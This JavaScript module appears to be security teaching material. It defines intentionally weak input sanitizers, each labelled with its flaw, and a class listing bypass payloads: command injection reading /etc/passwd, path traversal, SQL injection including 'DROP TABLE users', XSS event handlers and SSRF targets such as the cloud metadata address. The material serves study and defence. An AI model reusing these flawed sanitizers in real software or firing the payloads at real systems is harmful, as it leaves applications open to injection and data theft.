/**
 * Sanitizers - INTENTIONALLY WEAK sanitization functions
 * These demonstrate common mistakes in input validation
 */

class WeakSanitizers {

    /**
     * WEAK: Blacklist-based command sanitization
     * Can be bypassed with encoding, alternative commands, etc.
     */
    static sanitizeCommand(input) {
        // Blacklist approach - easily bypassed
        const blacklist = [';', '&', '|', '`', '$', '(', ')', '{', '}'];

        for (const char of blacklist) {
            input = input.replace(char, '');
        }

        // Misses: $(cmd), ${cmd}, newlines, backticks in different encodings
        return input;
    }

    /**
     * WEAK: Incomplete path sanitization
     * Only removes ../ but not ..\ or encoded variants
     */
    static sanitizePath(input) {
        // Incomplete - misses URL encoding, double encoding, ..\ etc.
        return input.replace(/\.\.\//g, '');
    }

    /**
     * WEAK: SQL sanitization by escaping quotes
     * Misses numeric injection, encoding attacks, etc.
     */
    static sanitizeSQL(input) {
        // Only escapes single quotes - misses many vectors
        return input.replace(/'/g, "''");
    }

    /**
     * WEAK: HTML sanitization by stripping tags
     * Can be bypassed with event handlers, partial tags, etc.
     */
    static sanitizeHTML(input) {
        // Only removes complete tags - misses event handlers, partial tags
        return input.replace(/<[^>]*>/g, '');
    }

    /**
     * WEAK: URL validation by checking protocol
     * Misses javascript:, data:, and SSRF vectors
     */
    static validateURL(url) {
        // Only checks for http/https - misses many protocols
        if (url.startsWith('http://') || url.startsWith('https://')) {
            return true;
        }
        return false;
    }

    /**
     * WEAK: Filename sanitization
     * Misses unicode normalization attacks, null bytes, etc.
     */
    static sanitizeFilename(filename) {
        // Basic - misses null bytes, unicode attacks, trailing dots on Windows
        return filename.replace(/[\/\\:*?"<>|]/g, '');
    }

    /**
     * WEAK: Email validation regex
     * Incomplete pattern that allows many invalid inputs
     */
    static validateEmail(email) {
        // Oversimplified regex - allows invalid emails
        const pattern = /^[^@]+@[^@]+\.[^@]+$/;
        return pattern.test(email);
    }

    /**
     * WEAK: JSON sanitization
     * Attempts to prevent __proto__ pollution but incomplete
     */
    static sanitizeJSON(obj) {
        // Only checks top level - misses nested __proto__
        if (obj.hasOwnProperty('__proto__')) {
            delete obj['__proto__'];
        }
        return obj;
    }

    /**
     * WEAK: IP address validation
     * Can be bypassed with IPv6, decimal notation, etc.
     */
    static isInternalIP(ip) {
        // Simple check - misses IPv6, decimal IPs, DNS rebinding
        const internalRanges = ['127.', '10.', '192.168.', '172.16.', '172.17.', '172.18.'];
        return internalRanges.some(range => ip.startsWith(range));
    }

    /**
     * WEAK: Content type validation
     * Trusts user-provided content type
     */
    static validateContentType(file) {
        // Trusts mimetype from client - can be spoofed
        const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
        return allowedTypes.includes(file.mimetype);
    }
}

/**
 * Bypass Examples - Show how the weak sanitizers can be bypassed
 */
class BypassExamples {

    static commandInjectionBypasses() {
        return [
            'cat /etc/passwd',           // Direct command
            '`cat /etc/passwd`',         // Backticks (if ` not in blacklist)
            '$(cat /etc/passwd)',        // Command substitution
            '\n cat /etc/passwd',        // Newline injection
            'cat${IFS}/etc/passwd',      // IFS bypass
            "cat$'\\x20'/etc/passwd"     // $'' quoting
        ];
    }

    static pathTraversalBypasses() {
        return [
            '....//....//etc/passwd',    // Double encoding
            '..\\..\\etc\\passwd',       // Backslash
            '..%252f..%252fetc/passwd',  // Double URL encoding
            '/etc/passwd',               // Absolute path (if allowed)
            '..%00/etc/passwd',          // Null byte
            '....\\\\....\\\\etc/passwd' // Mixed
        ];
    }

    static sqlInjectionBypasses() {
        return [
            '1 OR 1=1',                  // Numeric (no quotes)
            '1 OR 1=1--',                // With comment
            "1' OR '1'='1",              // Quote escaping
            '1 UNION SELECT null,null',  // Union injection
            '1; DROP TABLE users--'      // Stacked queries
        ];
    }

    static xssBypasses() {
        return [
            '<img src=x onerror=alert(1)>',          // Event handler
            '<svg onload=alert(1)>',                  // SVG
            '<body onpageshow=alert(1)>',            // Body event
            '<script>alert(1)</script',               // Unclosed tag
            'javascript:alert(1)',                    // javascript: URL
            '<img src="x" onerror="alert(1)">'       // Quoted attributes
        ];
    }

    static ssrfBypasses() {
        return [
            'http://127.0.0.1/',                      // Localhost
            'http://2130706433/',                     // Decimal IP
            'http://[::1]/',                          // IPv6 localhost
            'http://localtest.me/',                   // DNS that resolves to 127.0.0.1
            'http://169.254.169.254/',                // AWS metadata
            'http://0/',                              // Shorthand for 0.0.0.0
            'http://0x7f000001/'                      // Hex IP
        ];
    }
}

module.exports = {
    WeakSanitizers,
    BypassExamples
};
